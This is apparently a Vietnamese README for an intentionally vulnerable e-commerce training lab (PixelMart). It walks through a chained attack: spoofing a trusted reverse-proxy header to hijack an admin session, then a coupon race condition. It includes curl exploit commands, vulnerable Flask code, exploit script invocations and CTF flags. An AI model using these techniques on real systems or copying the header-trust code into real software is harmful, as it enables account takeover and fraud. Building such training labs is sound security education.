# PixelMart Lab — Chuỗi tấn công: Giả mạo header Reverse Proxy → Race Condition

Lab web giả lập một cửa hàng bán linh kiện máy tính (PixelMart), chứa
**hai lỗ hổng được cài đặt có chủ đích, nối tiếp nhau thành MỘT chuỗi
tấn công duy nhất** xoay quanh mã giảm giá 20%:

1. **Authentication Bypass by Spoofing một header tin tưởng từ reverse
   proxy** — CWE-290 — (xem mục 2b). Ứng dụng mô phỏng tính năng "đăng
   nhập qua reverse proxy / SSO header" rất phổ biến trong thực tế (vd.
   Gitea có hẳn tuỳ chọn `REVERSE_PROXY_AUTHENTICATION_USER`): nếu
   request mang header `X-Webauth-User`, app **tin tưởng hoàn toàn**
   đây là username đã được một reverse proxy phía trước xác thực giúp,
   và tự động đăng nhập bằng username đó — **không cần mật khẩu**. Điều
   kiện an toàn bắt buộc của cơ chế này là app không được nhận kết nối
   trực tiếp từ bên ngoài (chỉ proxy mới chạm tới được) — nhưng
   deployment của lab **vi phạm đúng điều kiện đó**: cổng của chính
   Flask vẫn được publish ra host song song với Nginx, nên bất kỳ ai
   cũng gọi thẳng tới được, bỏ qua Nginx hoàn toàn.
2. **Race Condition** dạng *Time-of-Check to Time-of-Use* (TOCTOU) —
   CWE-367 — ở chức năng áp mã giảm giá `POST /api/cart/apply-coupon`
   (xem mục 2a). Cơ chế race y hệt bản gốc, nhưng giờ **không thể khai
   thác được nếu chưa có mã thật** — tức là phải đi qua lỗ hổng #1
   trước.

Nói cách khác: **attacker phải giả mạo một header HTTP để chiếm đoạt
session của admin, rồi dùng chính session đó để đọc voucher thật, rồi
mới lợi dụng được race condition để nhân bản voucher đó.** Khác với một
lỗ hổng "quên kiểm tra quyền ở một endpoint" đơn giản, lỗ hổng #1 ở đây
nằm ở **tầng xác thực** (ai được coi là "đã đăng nhập") — đòi hỏi hiểu
đúng mô hình kiến trúc triển khai (reverse proxy + app phía sau) thay vì
chỉ dò từng endpoint một.

**Mọi route và mọi API quản trị khác đều kiểm tra quyền đúng cách** (xem
mục 2c) — lab được xây dựng kỹ để **chỉ duy nhất con đường giả mạo
header này** là có vấn đề, nhằm buộc người kiểm thử phải hiểu được bản
chất kiến trúc triển khai, thay vì chỉ rà từng endpoint để tìm chỗ thiếu
`require_admin()`.

Cả hai lỗ hổng đều là lỗi **business logic / access control / kiến
trúc triển khai**: mọi request gửi lên đều hợp lệ về cú pháp, đúng định
dạng. Scanner tự động (ZAP, Nuclei, Nikto…) rất khó hoặc không tìm ra:
lỗ hổng #1 chỉ lộ ra khi hiểu được mô hình triển khai (reverse proxy +
app phía sau) và thử gọi trực tiếp tới app, bỏ qua proxy; race condition
nằm ở **thứ tự thời gian xử lý** giữa nhiều request song song (xem mục
5) — cả hai đều không phải hành vi mà scanner thông thường mô phỏng.

---

## 1. Mô hình ứng dụng

PixelMart là một website bán linh kiện máy tính đầy đủ chức năng:

| Trang | Mô tả |
|---|---|
| `/` | Trang chủ: lưới sản phẩm, tìm kiếm theo tên, lọc theo danh mục |
| `/product/<id>` | Chi tiết sản phẩm: mô tả, sản phẩm liên quan, đánh giá (viết/xem) |
| `/register`, `/login` | Đăng ký tài khoản mới, đăng nhập |
| `/cart` | Giỏ hàng: xem/xoá sản phẩm, áp mã giảm giá, thanh toán |
| `/profile` | Xem/sửa thông tin cá nhân (họ tên, email, địa chỉ), đổi mật khẩu |
| `/orders`, `/orders/<id>` | Lịch sử đơn hàng (có trạng thái đơn mô phỏng) và chi tiết từng đơn (chỉ xem được đơn của chính mình) |
| `/about`, `/policy`, `/contact` | Trang giới thiệu, chính sách đổi trả/bảo hành, liên hệ (chỉ là nội dung tĩnh để tăng độ thật) |
| `/admin`, `/admin/orders` | Khu vực quản trị (**chỉ tài khoản role=admin**): bảng điều khiển thống kê (gồm cả mã giảm giá đang hoạt động), quản lý/xác minh thanh toán đơn hàng của toàn bộ khách hàng |

Luồng mua hàng: đăng ký/đăng nhập → duyệt/tìm sản phẩm (có lọc trang,
tìm kiếm, bộ lọc danh mục) → thêm vào giỏ → chọn phương thức thanh toán
(COD / chuyển khoản) → nhập mã giảm giá vào ô ở giỏ hàng (giảm 20%,
**chỉ được áp dụng 1 lần** cho mỗi giỏ hàng) → thanh toán (có tính phí
vận chuyển, miễn phí nếu đơn ≥ 300.000đ) → xem lại trong lịch sử đơn
hàng (trạng thái đơn thay đổi theo thời gian: Đang xác nhận → Đang đóng
gói → Đang giao hàng → Đã giao thành công).

> **Mã giảm giá không còn là hằng số công khai.** Mã được **sinh ngẫu
> nhiên khi container khởi động** (dạng `VIPxxxxxx`), lưu trong bảng
> `coupons`, và **chỉ hiển thị cho admin** qua `/admin`. Giao diện giỏ
> hàng chỉ còn một ô nhập tay trống — người dùng thường không có cách
> hợp lệ nào để biết mã, trừ khi admin chủ động gửi riêng (email/
> khuyến mãi, ngoài phạm vi lab). Đây chính là tiền đề cho chuỗi tấn
> công 2 lỗ hổng ở mục 2.

> **Kiến trúc triển khai có một reverse proxy.** Từ bản này, lab có 2
> service chạy song song (xem mục 3): `proxy` (Nginx, lắng nghe cổng
> 80 — "cửa chính" dự định) và `web` (Flask, lắng nghe cổng 5000). App
> Flask hỗ trợ tính năng "nhận diện người dùng qua header mà reverse
> proxy gắn vào" — xem mục 2b để biết tại sao đây lại là lỗ hổng duy
> nhất của lab.

- Backend: Python Flask + SQLite, chạy trong container Docker, tự reset
  dữ liệu mỗi lần container khởi động.
- Mật khẩu được hash (werkzeug), có 20 sản phẩm mẫu thuộc 7 danh mục.
- Tài khoản demo: `tester` / `Password123!` (bạn cũng có thể tự đăng ký
  tài khoản mới qua `/register`) — tài khoản thường, `role = 'user'`.
- Tài khoản admin demo: `admin` / `AdminPixelMart#2026!` — `role = 'admin'`,
  dùng để đăng nhập xem khu vực `/admin` hợp lệ, hoặc để đối chiếu hành vi
  "đúng" so với tài khoản thường khi kiểm thử lỗ hổng vượt quyền (mục 2b).
- Giao diện có banner khuyến mãi tự động chạy, khung xương (skeleton)
  khi tải giỏ hàng, huy hiệu niềm tin (miễn phí ship/bảo hành/đổi trả),
  số lượng đã bán trên mỗi sản phẩm, avatar màu cho người đánh giá,
  trang 404/500 tuỳ biến, SEO meta tag cơ bản, favicon, và bố cục tự co
  giãn trên di động (responsive).
- Giao diện sáng (light theme), tông xanh dương chủ đạo, dạng sàn TMĐT
  thật (topbar khuyến mãi, navbar có ô tìm kiếm + icon giỏ hàng, subnav
  danh mục, thẻ sản phẩm nền trắng bo góc đổ bóng, giá gạch ngang so
  sánh, phân trang kiểu nút tròn, footer nhiều cột) — lấy cảm hứng
  layout/màu từ một frontend TMĐT tham khảo, viết lại hoàn toàn bằng
  CSS thuần (`static/style.css`), không dùng framework/build step. Mọi
  route, tên trường form, id phần tử dùng trong JS (giỏ hàng, checkout)
  đều giữ nguyên — chỉ thay đổi giao diện, không đổi logic.
- Mỗi sản phẩm có 3 ảnh minh hoạ phong cách studio (`static/products/
  p<id>_1.jpg`, `_2.jpg`, `_3.jpg`) được vẽ hoàn toàn offline bằng
  Pillow (minh hoạ vector đơn giản theo từng loại sản phẩm, không tải
  ảnh/logo thật từ Internet) nên không có rủi ro bản quyền/thương hiệu
  và không cần mạng khi chạy trong Docker. Trang chủ/sản phẩm liên
  quan/giỏ hàng dùng ảnh đầu tiên làm ảnh đại diện; trang chi tiết sản
  phẩm có gallery 3 ảnh bấm để đổi ảnh chính.

  **Muốn dùng ảnh chụp thật thay vì ảnh vector?** Môi trường build/chạy
  sandbox dùng để phát triển lab này có tường lửa chỉ cho phép ra
  Internet tới các kho gói (pip/npm) và GitHub, nên không thể tự tải
  ảnh từ các kho ảnh stock (Unsplash/Pexels/Openverse...) ngay trong đó.
  Thay vào đó, repo có sẵn script tuỳ chọn `scripts/fetch_real_product_images.py`
  — chạy **một lần, thủ công, trên máy có Internet thật** (máy Windows
  của bạn, hoặc VM Debian nếu nó có mạng ra ngoài):

  ```bash
  pip install --break-system-packages requests pillow
  python3 scripts/fetch_real_product_images.py
  ```

  Script tự tìm và tải ảnh thật qua Openverse API (kho tổng hợp ảnh có
  giấy phép mở, miễn phí, không cần API key), chỉ lấy ảnh được phép
  dùng thương mại, resize/crop về đúng kích thước rồi **ghi đè** vào
  đúng `static/products/p<id>_1/2/3.jpg` — không cần sửa gì ở
  template/app.py. Nguồn/giấy phép từng ảnh được ghi lại vào
  `static/products/SOURCES.md` để tra cứu. Chạy xong thì build lại
  (`docker compose up --build -d`) là ảnh mới lên ngay. Nếu không chạy
  script này, lab vẫn hoạt động bình thường với ảnh vector có sẵn.
- Nút **Thanh toán** mô phỏng luồng checkout thật: hiện popup loading
  (~1.2-1.7s) rồi mới mở popup "Đặt hàng thành công" (có mã đơn, số
  tiền, email xác nhận, và flag nếu khai thác thành công) thay vì trả
  kết quả tức thì ra dòng chữ trên trang. Đây **chỉ là độ trễ hiển thị
  phía client** (JS `setTimeout`) — request thật tới `/api/cart/checkout`
  vẫn được gửi và xử lý ngay lập tức, không có gì thay đổi ở backend.
  Mục đích là để giao diện không "lộ" kết quả bất thường một cách lộ
  liễu khi bấm nút thủ công, buộc người kiểm thử phải bắt/gửi lại
  request bằng Burp Repeater hoặc script (như `exploit/race_coupon.py`)
  thay vì chỉ click nút nhanh tay trên UI mới phát hiện và khai thác
  được race condition.
- Nút **Dùng mã** (áp mã giảm giá) áp dụng đúng cùng cơ chế: bấm vào sẽ
  bị **disable ngay lập tức** (chặn double-click tay thật) và hiện popup
  loading ~0.9-1.4s rồi mới ra popup kết quả (thành công/thất bại) thay
  vì phản hồi ngay. Cũng chỉ là độ trễ hiển thị phía client — request
  thật tới `/api/cart/apply-coupon` vẫn được xử lý tức thì. Kết hợp cả
  hai nút, việc chỉ bấm tay liên tục trên trình duyệt (kể cả rất nhanh)
  **không còn khả thi** để kích hoạt race condition nữa — phải chủ đích
  gửi nhiều request đồng thời bằng Burp Repeater (gộp nhóm gửi song
  song) hoặc script (`exploit/race_coupon.py`, dùng `threading`) mới
  khai thác được, đúng tinh thần một lỗ hổng business-logic yêu cầu tư
  duy kiểm thử chủ động thay vì chỉ thao tác UI thông thường.

> **Lưu ý về phạm vi lỗ hổng:** toàn bộ các chức năng còn lại (đăng ký,
> đăng nhập bằng mật khẩu, trang cá nhân, lịch sử đơn hàng, đánh giá
> sản phẩm, và **toàn bộ** khu vực `/admin/*`) đều được viết an toàn có
> chủ đích — có kiểm tra quyền sở hữu (vd. `/orders/<id>` chỉ cho xem
> đơn hàng của chính người đăng nhập), có kiểm tra quyền admin đúng
> cách trên MỌI endpoint `/api/admin/*` (không còn ngoại lệ nào), dùng
> parameterized query, không có `|safe` trong template. **Lab có đúng
> HAI lỗ hổng đã được xác nhận, được thiết kế để nối tiếp nhau thành
> một chuỗi tấn công duy nhất**: giả mạo header reverse-proxy để chiếm
> session admin (mục 2b), sau đó race condition ở
> `/api/cart/apply-coupon` (mục 2a) để nhân bản mã giảm giá đọc được
> từ session đó. Các endpoint quản trị khác như `GET /api/admin/orders`
> hay `POST /api/admin/orders/<id>/update-status` chỉ để làm bối cảnh
> giống một cửa hàng thật và chứng minh "mọi API quản trị đều kiểm tra
> quyền đúng cách" — vấn đề duy nhất nằm ở tầng xác thực phía trước
> chúng, không nằm ở chính các endpoint này.

## 2a. Lỗ hổng #1 — Race Condition (TOCTOU) ở coupon

File `app.py`, route `/api/cart/apply-coupon`. Luồng xử lý:

```
1. TIME OF CHECK : SELECT coupon_applied FROM carts WHERE id = ?
2. (giả lập xử lý nghiệp vụ tốn thời gian — sleep 0.35s)
3. TIME OF USE   : UPDATE carts SET coupon_applied = 1, coupon_uses += 1
```

Bước kiểm tra (1) và bước ghi nhận (3) **không nằm trong một thao tác
nguyên tử (atomic)**. Giữa hai bước có một khoảng trễ (race window).
Nếu nhiều request `apply-coupon` được gửi gần như đồng thời, tất cả đều
đọc `coupon_applied = 0` ở bước (1) **trước khi** bất kỳ request nào
kịp ghi `coupon_applied = 1` ở bước (3) — nên tất cả đều vượt qua điều
kiện kiểm tra và cộng dồn giảm giá 20% nhiều lần.

Hệ quả: giỏ hàng trị giá hàng triệu đồng có thể giảm về gần 0đ.

> Lưu ý sư phạm: độ trễ `time.sleep(0.35)` được thêm vào có chủ đích để
> race window đủ rộng, dễ khai thác bằng tay hoặc bằng script đơn giản.
> Trong thực tế race window thường hẹp hơn nhiều (vài mili-giây do độ
> trễ I/O của database thật), nhưng bản chất lỗi và cách khai thác
> (bắn nhiều request song song) là giống hệt.

**Điểm quan trọng:** điều kiện `code != coupon_hop_le` so sánh với giá
trị đọc từ bảng `coupons` trong CSDL — một mã **sinh ngẫu nhiên** (vd.
`VIP7A3F1C`), không phải chuỗi hardcode hay hiển thị công khai ở bất kỳ
đâu. Cơ chế race (sleep giữa SELECT và UPDATE) hoàn toàn không đổi —
nhưng **vô dụng nếu attacker chưa biết mã thật**, vì mọi request với mã
sai đều bị từ chối ngay ở bước kiểm tra mã, trước khi chạm tới đoạn code
có lỗi race. Đây chính là lý do lỗ hổng #2 trở nên cần thiết.

---

## 2b. Lỗ hổng #2 — Giả mạo header xác thực tin tưởng từ Reverse Proxy

### Bối cảnh: "đăng nhập qua reverse proxy" là gì

Trong thực tế, rất nhiều hệ thống (Gitea, GitLab, Jenkins, các app nội
bộ doanh nghiệp...) hỗ trợ một kiểu xác thực gọi là **reverse-proxy /
header authentication**: một reverse proxy (thường tích hợp sẵn SSO,
LDAP, hoặc một hệ thống đăng nhập tập trung khác) đặt **trước** app,
tự xác thực người dùng bằng cơ chế của riêng nó, rồi gắn một HTTP
header (vd. `X-Webauth-User`, `Remote-User`...) chứa username **đã
được xác thực** trước khi forward request vào app phía sau. App **tin
tưởng hoàn toàn** giá trị header đó — không hỏi lại mật khẩu — vì nó
giả định: *"request này không thể đến từ đâu khác ngoài proxy, vì app
không lộ ra ngoài"*.

Gitea tài liệu hoá rõ tính năng này
(`REVERSE_PROXY_AUTHENTICATION_USER`) và **cảnh báo rành rành**: nếu
app vẫn có thể bị truy cập trực tiếp (bỏ qua proxy), BẤT KỲ AI cũng có
thể tự gắn header đó với giá trị tuỳ ý để giả làm bất kỳ user nào —
kể cả admin — mà không cần biết mật khẩu. Đây chính là lỗ hổng lab này
mô phỏng lại.

### Cài đặt trong lab (`app.py`)

```python
TRUSTED_PROXY_AUTH_HEADER = "X-Webauth-User"

def try_trusted_proxy_login():
    if current_user_id():
        return  # da co session dang nhap binh thuong
    header_user = request.headers.get(TRUSTED_PROXY_AUTH_HEADER)
    if not header_user:
        return
    db = get_db()
    user = db.execute("SELECT * FROM users WHERE username = ?", (header_user,)).fetchone()
    if user is None:
        return
    session["user_id"] = user["id"]
    session["username"] = user["username"]
    session["via_trusted_proxy_header"] = True
    get_or_create_cart(db, user["id"])

@app.before_request
def _enforce_trusted_proxy_auth():
    try_trusted_proxy_login()
```

Hàm này chạy **trước mọi request** (qua `before_request`). Nếu request
mang header `X-Webauth-User: <username>` và username đó có thật trong
CSDL, app lập tức tạo session đăng nhập như username đó — **không hỏi
mật khẩu**.

### Vì sao đây là lỗ hổng, chứ không phải tính năng đúng

Điều kiện an toàn **bắt buộc** của cơ chế này: app phía sau **tuyệt
đối không được** nhận kết nối trực tiếp từ bất kỳ nguồn nào khác ngoài
chính reverse proxy (thường đảm bảo bằng cách chỉ mở app trên mạng nội
bộ/docker network, hoặc kiểm tra `REMOTE_ADDR` khớp với IP cố định của
proxy). Code ở trên **không hề kiểm tra** request đến từ đâu — nó tin
tưởng header một cách vô điều kiện.

Và đây chính là chỗ lab "vi phạm" điều kiện đó một cách có chủ đích,
ở tầng hạ tầng (`docker-compose.yml`) chứ không phải ở code Python:

```yaml
services:
  web:
    build: .
    ports:
      - "5000:5000"   # <-- MISCONFIG: cong nay dang ly CHI nen duoc
                       #     Nginx goi toi qua mang noi bo, khong nen
                       #     publish ra host/Internet
  proxy:
    image: nginx:1.27-alpine
    ports:
      - "80:80"        # <-- day moi la "cua chinh" du dinh
```

Nginx (`nginx.conf`) thậm chí được cấu hình **đúng cách** — nó chủ động
xoá trắng header `X-Webauth-User` trên mọi request đi qua nó (dòng
`proxy_set_header X-Webauth-User "";`), đúng như khuyến cáo chính thức
khi dùng co che nay. Nghĩa là: **đi qua đúng "cửa chính" (cổng 80) thì
không thể giả mạo được header này.** Nhưng vì cổng `5000` của Flask vẫn
bị lộ song song, attacker chỉ cần **bỏ qua Nginx hoàn toàn**, gọi thẳng
tới Flask, và tự gắn header đó — app không có cách nào phân biệt được
request này với một request hợp pháp từ Nginx.

```bash
# Goi THANG toi Flask (cong 5000), bo qua Nginx (cong 80) hoan toan
curl -s -H "X-Webauth-User: admin" http://<host>:5000/api/whoami
# -> {"logged_in": true, "username": "admin", "role": "admin",
#     "flag": "LAB{reverse_proxy_trusted_header_admin_takeover_pixelmart}"}
```

Không cần biết mật khẩu `AdminPixelMart#2026!` — chỉ cần biết username
`admin` đã có sẵn (được dùng công khai trong toàn bộ tài liệu/demo của
lab, giống một username quản trị "mặc định"/dễ đoán trong thực tế).

### Vì sao lại "phức tạp hơn" một endpoint thiếu kiểm tra quyền

Khác với kiểu lỗi BFLA đơn giản ("một API quên gọi hàm kiểm tra
quyền"), lỗ hổng này **không nằm ở bất kỳ API `/api/admin/*` nào cả** —
mọi API đó đều gọi `require_admin()` đúng cách (xem mục 2c). Vấn đề nằm
ở **tầng xác thực phía trước toàn bộ ứng dụng**, và việc tìm ra nó đòi
hỏi:

1. Hiểu được **kiến trúc triển khai thực tế** (có reverse proxy, có
   app phía sau) — không chỉ rà từng endpoint đơn lẻ.
2. Nhận ra ứng dụng hỗ trợ cơ chế "tin tưởng header" (qua tài liệu, mã
   nguồn công khai, hoặc dò các header quen thuộc của những hệ thống
   tương tự như `X-Webauth-User`, `X-Forwarded-User`, `Remote-User`...).
3. Kiểm tra xem app có **thực sự bị cách ly** khỏi truy cập trực tiếp
   hay không — bằng cách quét cổng/thử kết nối trực tiếp tới cổng nội
   bộ dự kiến của app (ở đây là `5000`), thay vì chỉ tương tác qua cổng
   công khai (`80`).
4. Thử gắn header đó với một username đã biết (vd. `admin`) khi gọi
   trực tiếp, và quan sát việc được "đăng nhập" ngay không cần mật khẩu.

Đây là một lớp lỗ hổng rất thực tế và nguy hiểm trong các hệ thống có
kiến trúc nhiều tầng (reverse proxy + app + microservices...): an toàn
của toàn bộ hệ thống phụ thuộc vào một **giả định về mạng/triển khai**
(app không lộ ra ngoài) mà rất dễ bị vi phạm bởi một thay đổi hạ tầng
tưởng như vô hại (vd. thêm một port-mapping để debug rồi quên xoá).

---

## 2c. Chuỗi tấn công kết hợp — từ giả mạo header đến race condition

Hai lỗ hổng ở trên **vô dụng nếu đứng riêng**:

- Chỉ có lỗ hổng #1 (mục 2b) → attacker chiếm được session admin và
  đọc được mã giảm giá, nhưng dùng mã đó bình thường thì cũng chỉ được
  giảm giá 20% **đúng 1 lần** như mọi khách hàng khác — không có gì
  bất thường, không có "lỗi" thực sự xảy ra.
- Chỉ có race condition (mục 2a) → cơ chế TOCTOU vẫn còn đó về mặt kỹ
  thuật, nhưng **không thể khai thác được** vì attacker không có mã hợp
  lệ để thử — mọi request race đều bị chặn ngay ở bước kiểm tra mã.

**Chỉ khi kết hợp cả hai theo đúng thứ tự**, attacker mới đạt được hậu
quả thực sự nghiêm trọng:

```
┌──────────────────────┐     ┌───────────────────────┐     ┌──────────────────────┐
│ 1. Goi THANG toi Flask │ --> │ 2. Doc ma giam gia      │ --> │ 3. Race condition      │
│    (cong 5000, bo qua  │     │    GET /api/admin/      │     │    POST /api/cart/     │
│    Nginx) kem header   │     │    coupon - API nay     │     │    apply-coupon        │
│    X-Webauth-User:     │     │    dung (require_admin) │     │    (nhieu luong        │
│    admin -> session    │     │    nhung session dang   │     │    cung luc)           │
│    gia mao             │     │    goi la GIA MAO        │     │                        │
└──────────────────────┘     └───────────────────────┘     └──────────────────────┘
                                                                        │
                                                                        v
                                                        ┌───────────────────────┐
                                                        │ 4. Checkout            │
                                                        │    giỏ hàng gần như 0đ │
                                                        │    + flag              │
                                                        └───────────────────────┘
```

Mỗi bước được "chấm điểm" độc lập bằng một flag riêng, để người kiểm
thử (hoặc người chấm bài) xác nhận được đã hoàn thành đúng từng giai
đoạn của chuỗi:

| Bước | Flag | Ý nghĩa |
|---|---|---|
| Chiếm session admin qua header giả mạo (2b) | `LAB{reverse_proxy_trusted_header_admin_takeover_pixelmart}` | Xác nhận đã khai thác được lỗ hổng CWE-290, có session admin mà không cần mật khẩu |
| Race condition + checkout (2a) | `LAB{race_cond1tion_t0ctou_coupon_stack_pixelmart}` | Xác nhận đã dùng mã giảm giá đọc được từ session ở bước trên để khai thác race condition, hoàn tất đơn hàng gần như 0đ |

Script `exploit/race_coupon.py` mô phỏng đúng chuỗi này trong MỘT lần
chạy (tự chiếm session admin qua header khi dùng cờ `--spoof-admin-header`),
còn `exploit/spoof_admin_header.py` tách riêng bước 1-2 để minh hoạ rõ
từng giai đoạn — xem hướng dẫn chi tiết (kể cả cách làm thủ công bằng
Burp) ở mục 4.

---

## 3. Triển khai bằng Docker trên Debian

### 3.1. Cài Docker (nếu máy Debian chưa có)

```bash
sudo apt update && sudo apt install -y docker.io docker-compose-plugin
sudo systemctl enable --now docker
sudo usermod -aG docker $USER   # rồi đăng xuất/đăng nhập lại để khỏi cần sudo
```

### 3.2. Build và chạy lab

```bash
git clone https://github.com/tuanhungh81sc/pixelmart.git
cd pixelmart
docker compose up --build -d
```

Lệnh này khởi động **2 container**:

- `pixelmart-lab` (service `web`) — chính app Flask, lắng nghe cổng
  `5000`.
- `pixelmart-lab-proxy` (service `proxy`) — Nginx đóng vai "cửa chính"
  dự định, lắng nghe cổng `80`, forward vào `web:5000` qua mạng nội bộ
  của docker-compose (xem `nginx.conf`).

Kiểm tra container đang chạy:

```bash
docker compose ps
docker compose logs -f
```

Mở trình duyệt tới `http://localhost` (cổng 80, qua Nginx) hoặc
`http://localhost:5000` (cổng 5000, thẳng vào Flask — **đây chính là
con đường bị lộ co chủ đích, xem mục 2b**), đăng nhập bằng
`tester` / `Password123!`.

> **Vì sao cả 2 cổng đều mở?** Đây là thiết kế có chủ đích của lab
> (không phải sơ suất khi viết README) — xem mục 2b để biết chi tiết
> tại sao việc cổng `5000` vẫn lộ ra ngoài song song với Nginx lại
> chính là lỗ hổng duy nhất của bài lab này.

### 3.3. Dừng / reset lab

```bash
docker compose down        # dừng
docker compose up --build -d   # chạy lại, dữ liệu tự reset sạch
```

---

## 4. Hướng dẫn kiểm thử thủ công (Burp Suite / trình duyệt)

Khác với các bản trước, bạn **chưa có mã giảm giá hợp lệ nào** ngay từ
đầu — `/cart` chỉ có một ô nhập tay trống. Phải đi đúng theo chuỗi 2 lỗ
hổng: giả mạo header để chiếm session admin (mục 4a/4b dưới), rồi mới
race được (mục 4c). Nếu chỉ muốn test riêng cơ chế race với một mã bất
kỳ đã biết (vd. để chấm điểm nhanh), có thể bỏ qua 4a và tự lấy mã qua
`/admin` bằng tài khoản admin có sẵn.

### Bước 4a — Tóm tắt nhanh (xem chi tiết đầy đủ ở mục 4b)

```bash
# Goi THANG toi cong cua Flask (5000) - KHONG phai cong 80 cua Nginx,
# vi Nginx da xoa trang header nay tren moi request di qua no.
curl -s -H "X-Webauth-User: admin" http://localhost:5000/api/whoami
# -> {"logged_in": true, "username": "admin", "role": "admin",
#     "flag": "LAB{reverse_proxy_trusted_header_admin_takeover_pixelmart}"}

# Dung LAI cookie session vua tao de doc ma giam gia thuc:
curl -s -c cookies.txt -H "X-Webauth-User: admin" http://localhost:5000/api/whoami -o /dev/null
curl -s -b cookies.txt http://localhost:5000/api/admin/coupon
# -> {"code": "VIPxxxxxx", "percent": 20, "active": true}
```

Ghi lại giá trị `code` — đây chính là mã sẽ dùng để race ở bước 4c.

### Bước 4b — Chi tiết kiểm thử giả mạo header reverse-proxy

#### Nhận diện kiến trúc triển khai

Thử truy cập cả hai cổng trên server:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost/          # qua Nginx (cong 80)
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:5000/     # thang toi Flask (cong 5000)
```

Cả hai đều trả về `200` — nghĩa là app Flask có thể bị truy cập **trực
tiếp**, không chỉ qua Nginx. Đây là dấu hiệu đầu tiên cho thấy "lớp bảo
vệ ở tầng mạng" (chỉ proxy mới chạm được app) không tồn tại.

#### Thử gắn header xác thực quen thuộc của cơ chế reverse-proxy auth

Những hệ thống dùng cơ chế này thường dùng một vài tên header quen
thuộc: `X-Webauth-User`, `X-Forwarded-User`, `Remote-User`,
`X-Remote-User`... Thử gắn từng header đó với một username đã biết
(username `admin` là tài khoản quản trị "mặc định" quen thuộc), gọi
vào cổng Flask trực tiếp:

```bash
curl -s -H "X-Webauth-User: admin" http://localhost:5000/api/whoami
# -> {"logged_in": true, "username": "admin", "role": "admin", "flag": "..."}
```

Ngay lập tức được công nhận là `admin`, **không hỏi mật khẩu**.

#### Đối chứng: cùng header đó, gọi qua Nginx (cổng 80) thì KHÔNG hoạt động

```bash
curl -s -H "X-Webauth-User: admin" http://localhost/api/whoami
# -> {"logged_in": false}
```

Vì `nginx.conf` chủ động xoá trắng header này trên mọi request đi qua
nó — xác nhận: **Nginx được cấu hình đúng**, lỗ hổng chỉ tồn tại vì
cổng Flask bị lộ song song, không phải vì Nginx cấu hình sai.

#### Dùng chính session chiếm được để đọc dữ liệu quản trị thật

```bash
curl -s -c cookies.txt -H "X-Webauth-User: admin" http://localhost:5000/ -o /dev/null
curl -s -b cookies.txt http://localhost:5000/api/admin/coupon
# -> {"code":"VIPxxxxxx","percent":20,"active":true}
curl -s -b cookies.txt http://localhost:5000/admin   # trang HTML, cung xem duoc
```

Lưu ý: `GET /api/admin/coupon` ở đây **không có lỗi gì cả** — nó gọi
`require_admin()` đúng cách và thực sự đang nói chuyện với một session
có `role = 'admin'` hợp lệ trong CSDL. Vấn đề là session đó chưa từng
được tạo ra bằng mật khẩu thật của admin.

#### Khai thác bằng script có sẵn trong lab

```bash
pip install --break-system-packages requests
python3 exploit/spoof_admin_header.py --url http://localhost:5000
```

Script tự động thực hiện đúng các bước trên: gọi `GET /api/whoami`
trước/sau khi gắn header `X-Webauth-User: admin` vào request gửi THẲNG
tới cổng Flask, in ra flag khi chiếm được session admin, rồi dùng
chính session đó gọi `GET /api/admin/coupon` để đọc mã giảm giá thật và
gợi ý lệnh chạy tiếp bước race condition.

---

## 4c. Khai thác race condition (sau khi đã có mã từ bước 4a/4b)

### Bước 1 — Xác nhận hành vi "bình thường" (chặn áp mã 2 lần)

1. Đăng nhập, thêm 1 sản phẩm bất kỳ vào giỏ.
2. Mở trang giỏ hàng `/cart`, dán mã vừa lấy được (vd. `VIPxxxxxx`) vào
   ô **Nhập mã giảm giá...**, bấm **Dùng mã** → thấy giảm 20%.
   (Hai mã trang trí `FREESHIP50` và `WELCOME10` hiển thị bên dưới
   không hoạt động — không phải mục tiêu khai thác của lab này.)
3. Dán lại mã đó, bấm **Dùng mã** lần nữa → ứng dụng báo lỗi
   `coupon already applied`.

→ Điều này cho thấy có một cơ chế kiểm tra "đã dùng chưa", và nó **hoạt
động đúng khi gửi tuần tự**. Đây chính là điểm khiến scanner tự động bỏ
qua: test tuần tự không phát hiện ra vấn đề gì.

### Bước 2 — Soi request bằng Burp Suite

1. Bật Burp, trỏ proxy trình duyệt qua Burp (`127.0.0.1:8080`).
2. Thêm sản phẩm vào giỏ, mở **Proxy → HTTP history**, tìm request:

   ```
   POST /api/cart/apply-coupon HTTP/1.1
   Host: localhost:5000
   Cookie: session=...
   Content-Type: application/json

   {"code":"VIPxxxxxx"}
   ```
3. Click phải → **Send to Repeater**.
4. Trong Repeater, gửi request này 2 lần liên tiếp bằng tay → lần 2 báo
   lỗi `coupon already applied` (xác nhận lại bước 1).

### Bước 3 — Khai thác race condition bằng Burp Repeater (nhóm song song)

Burp Suite 2023.9 trở lên hỗ trợ gửi nhiều request trong Repeater **cùng
lúc** qua kỹ thuật *single-packet attack* (giảm jitter mạng xuống gần 0):

1. Trong tab Repeater đang có request `apply-coupon`, nhấn **Ctrl** (hoặc
   **Cmd** trên Mac) và click để chọn thêm nhiều tab Repeater khác đang
   chứa cùng request đó (hoặc duplicate tab request đó ra 15–20 tab).
2. Click phải vào nhóm tab đã chọn → **Send group in parallel**
   (hoặc **Send group in sequence (single connection)** tùy phiên bản).
3. Chọn chế độ gửi song song nhất có thể.
4. Sau khi gửi, kiểm tra từng response trong nhóm: nếu nhiều hơn 1
   response trả về `"ok": true` (thay vì chỉ 1 cái `ok` và phần còn lại
   `coupon already applied`) → **đã khai thác thành công race
   condition**.
5. Quay lại trình duyệt, refresh giỏ hàng → thấy `coupon_uses` > 1,
   `final_price` giảm sâu bất thường (có thể về 0đ).
6. Bấm **Thanh toán** → nếu áp mã ≥ 3 lần và giá cuối ≤ 10% giá gốc,
   ứng dụng trả về `flag` trong JSON response của `/api/cart/checkout`.

> Nếu chưa có Burp Suite Pro (tính năng gửi song song chỉ có ở bản trả
> phí hoặc extension Turbo Intruder), dùng script ở Bước 4 — hiệu quả
> tương đương và miễn phí.

### Bước 4 — Khai thác bằng script có sẵn trong lab

Lab đi kèm sẵn script khai thác tại `exploit/race_coupon.py`. Có thể
chạy ở 2 chế độ:

```bash
pip install --break-system-packages requests

# Che do 1: tu dong chiem session admin qua header (chuoi day du trong 1 lan chay)
python3 exploit/race_coupon.py --url http://localhost:5000 \
    --user tester --password 'Password123!' \
    --spoof-admin-header --threads 20

# Che do 2: da co ma san (vd lay bang Burp o buoc 4a/4b)
python3 exploit/race_coupon.py --url http://localhost:5000 \
    --user tester --password 'Password123!' \
    --code VIPxxxxxx --threads 20
```

